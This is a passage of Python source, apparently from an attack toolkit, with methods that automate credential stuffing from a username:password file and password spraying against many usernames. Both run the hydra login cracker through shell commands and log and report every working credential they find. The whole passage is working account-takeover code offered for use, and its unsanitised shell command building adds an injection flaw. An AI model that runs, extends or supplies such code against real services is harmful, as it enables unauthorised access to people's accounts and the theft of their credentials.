    def credential_stuffing(self, target, service, credential_file):
        """Credential list reuse"""
        self.log(f"Starting credential stuffing on {target} for {service}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append(f"credential_stuffing_{service}")

        try:
            with open(credential_file, 'r', errors='ignore') as f:
                credentials = [line.strip().split(':') for line in f.readlines() if ':' in line.strip()]
        except FileNotFoundError:
            self.log(f"Credential file not found: {credential_file}", "error")
            self.is_running = False
            return "Credential file not found"

        found = []

        for cred in credentials:
            if not self.is_running:
                break
            if len(cred) < 2:
                continue

            username, password = cred[0], cred[1]
            self.stats["total_attempts"] += 1

            cmd = f"hydra -l {username} -p {password} {target} {service}"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                output = result.stdout + result.stderr

                if f'[{service}]' in output and 'host:' in output:
                    cred_entry = {
                        "service": service,
                        "username": username,
                        "password": password,
                        "target": target
                    }
                    found.append(cred_entry)
                    self.found_credentials.append(cred_entry)
                    self.stats["successful_attempts"] += 1
                    self.log(f"Credential reuse found! {username}:{password}", "success")
                else:
                    self.stats["failed_attempts"] += 1
            except Exception:
                self.stats["failed_attempts"] += 1
                continue

        self.results[f"credential_stuffing_{service}"] = {
            "success": len(found) > 0,
            "credentials": found,
            "total_tested": len(credentials)
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return found

    def password_spray(self, target, service, password, usernames):
        """Single password against many users"""
        self.log(f"Starting password spray on {target} for {service}", "warning")
        self.is_running = True
        self.stats["start_time"] = datetime.now().isoformat()
        self.stats["services_tested"].append(f"password_spray_{service}")

        found = []

        for username in usernames:
            if not self.is_running:
                break

            self.stats["total_attempts"] += 1

            cmd = f"hydra -l {username} -p {password} {target} {service}"
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                output = result.stdout + result.stderr

                if f'[{service}]' in output and 'host:' in output:
                    cred = {
                        "service": service,
                        "username": username,
                        "password": password,
                        "target": target
                    }
                    found.append(cred)
                    self.found_credentials.append(cred)
                    self.stats["successful_attempts"] += 1
                    self.log(f"Password spray success! {username}:{password}", "success")
                else:
                    self.stats["failed_attempts"] += 1
            except Exception:
                self.stats["failed_attempts"] += 1
                continue

        self.results[f"password_spray_{service}"] = {
            "success": len(found) > 0,
            "credentials": found,
            "password_used": password,
            "users_tested": usernames
        }

        self.is_running = False
        self.stats["end_time"] = datetime.now().isoformat()
        return found

    def post_bruteforce(self):
        """Post-brute force actions"""
        self.log("Executing post-brute force actions", "info")

        # Save found credentials
        if self.found_credentials:
            report = self.generate_report()
            # TODO: Save report
            self.log(f"Credentials found: {len(self.found_credentials)}", "success")

    def stop(self):
        """Stop attack"""
        self.is_running = False
        self.log("Attack stopped by user", "warning")

    def generate_report(self):
        """Comprehensive report with stats"""
        self.stats["end_time"] = datetime.now().isoformat()

        success_rate = 0
        if self.stats["total_attempts"] > 0:
            success_rate = (self.stats["successful_attempts"] / self.stats["total_attempts"]) * 100

        report = {
            "title": "Brute Force Report",
            "timestamp": datetime.now().isoformat(),
            "summary": {
                "total_services_tested": len(self.stats["services_tested"]),
                "services": self.stats["services_tested"],
                "total_attempts": self.stats["total_attempts"],
                "successful_attempts": self.stats["successful_attempts"],
                "failed_attempts": self.stats["failed_attempts"],
                "success_rate": f"{success_rate:.2f}%",
                "total_credentials_found": len(self.found_credentials),
                "duration": self._calculate_duration()
            },
            "credentials": self.found_credentials,
            "results_by_service": self._group_credentials_by_service(),
            "raw_results": self.results
        }

        self.log(f"Report generated: {len(self.found_credentials)} credentials found in {self.stats['total_attempts']} attempts", "success")
        return report

    def _calculate_duration(self):
        """Calculate attack duration"""
        if self.stats["start_time"] and self.stats["end_time"]:
            start = datetime.fromisoformat(self.stats["start_time"])
            end = datetime.fromisoformat(self.stats["end_time"])
            delta = end - start
            return str(delta)
        return "N/A"

    def _group_credentials_by_service(self):
        """Group credentials by service"""
        grouped = {}
        for cred in self.found_credentials:
            service = cred["service"]
            if service not in grouped:
                grouped[service] = []
            grouped[service].append(cred)
        return grouped